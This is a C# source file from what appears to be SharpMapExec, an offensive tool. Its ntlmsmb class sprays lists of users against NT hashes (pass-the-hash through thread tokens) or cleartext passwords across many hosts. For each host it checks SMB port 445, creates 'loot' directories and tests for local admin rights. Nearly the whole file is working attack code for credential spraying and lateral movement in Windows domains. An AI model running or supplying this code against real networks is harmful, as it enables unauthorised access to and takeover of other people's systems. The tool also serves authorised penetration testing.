using SharpMapExec.Helpers;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using static SharpMapExec.Helpers.SecurityContext;

namespace SharpMapExec.Lib
{
    public class ntlmsmb
    {
        public static void NtlmSmb<T>(string[] users, string domain, T secrets, string[] computernames, string module, string moduleargument)
        {
            //StartJob(users, domain, secrets, computernames, module, moduleargument);
            var listOfTasks = new List<Task>();
            listOfTasks.Add(new Task(() => StartJob(users, domain, secrets, computernames, module, moduleargument)));
            Tasks.StartAndWaitAllThrottled(listOfTasks, 1);
        }

        public static void StartJob<T>(string[] users, string domain, T secrets, string[] computernames, string module, string moduleargument)
        {
            string[] passwords;
            if (typeof(T) == typeof(NTHash))
            {
                passwords = (string[])secrets.GetType().GetProperties().Single(pi => pi.Name == "Nthash").GetValue(secrets, null);
                foreach (string user in users)
                {
                    foreach (string password in passwords)
                    {
                        Console.WriteLine("------------------");
                        Console.WriteLine(string.Format("[*] User:   {0}", user));
                        Console.WriteLine(string.Format("[*] domain: {0}", domain));
                        Console.WriteLine(string.Format("[*] secret:   {0}", password));
                        Console.WriteLine();
                        SetThreadToken(user, domain, password);
                        foreach (string computername in computernames)
                        {
                            Console.WriteLine(String.Format("[*] Checking {0}", computername));
                            if (!Misc.CheckHostPort(computername, 445))
                            {
                                Console.WriteLine(String.Format("[-] Could Not Reach {0}:445", computername));
                                Console.WriteLine();
                                continue;
                            }
                            if (!Directory.Exists(Path.Combine("loot", computername)))
                            {
                                Directory.CreateDirectory(Path.Combine("loot", computername));
                            }
                            Smb.CheckLocalAdmin(computername, module);
                            Console.WriteLine("");
                        }
                    }
                }
            }
            else if (typeof(T) == typeof(ClearText))
            {
                passwords = (string[])secrets.GetType().GetProperties().Single(pi => pi.Name == "Cleartext").GetValue(secrets, null);
                foreach (string user in users)
                {
                    foreach (string password in passwords)
                    {
                        Console.WriteLine("------------------");
                        Console.WriteLine(string.Format("[*] User:   {0}", user));
                        Console.WriteLine(string.Format("[*] domain: {0}", domain));
                        Console.WriteLine(string.Format("[*] secret: {0}", password));
                        Console.WriteLine();
                        using (new Impersonator.Impersonation(domain, user, password))
                        {
                            foreach (string computername in computernames)
                            {
                                Console.WriteLine(String.Format("[*] Checking {0}", computername));
                                if (!Misc.CheckHostPort(computername, 445))
                                {
                                    Console.WriteLine(String.Format("[-] Could Not Reach {0}:445", computername));
                                    Console.WriteLine();
                                    continue;
                                }
                                if (!Directory.Exists(Path.Combine("loot", computername)))
                                {
                                    Directory.CreateDirectory(Path.Combine("loot", computername));
                                }
                                Smb.CheckLocalAdmin(computername, module);
                                Console.WriteLine("");
                            }
                        }
                    }
                }
            }
        }
    }
}